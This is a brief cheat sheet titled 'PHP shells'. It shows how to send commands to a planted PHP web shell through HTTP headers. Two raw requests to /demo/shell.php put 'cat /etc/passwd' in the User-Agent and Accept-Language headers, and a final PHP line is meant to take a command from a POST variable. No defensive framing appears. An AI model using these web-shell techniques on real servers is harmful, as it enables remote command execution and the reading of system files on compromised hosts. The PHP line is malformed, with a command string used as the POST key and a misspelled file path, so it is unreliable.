
# PHP shells


**(1) HTTP_USER_AGENT_SHELL**
  
**SET SHELL COMMANDS IN USER-AGENT HEADER**
  
GET /demo/shell.php HTTP/1.1
Host: 192.168.5.25
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Accept: text/html,application/xhtml+xml
Upgrade-Insecure-Requests: 1
**User-Agent: cat /etc/passwd**
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-GB,en-U 

****

**(2) HTTP_ACCEPT_LANGUAGE_SHELL**
 
**SET SHELL COMMANDS IN ACCEPT_LANGUAGE HEADER**

GET /demo/shell.php HTTP/1.1
Host: 192.168.5.25
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112.                        
Accept-Encoding: gzip.                      
**Accept-Language: cat /etc/passwd**

****
  

**(3) POST WITH VARIABLE**
  
**JUST ADD YOUR COMMAND IN VARIABLE B**
  
$b = $_POST['cat /etc/password'];
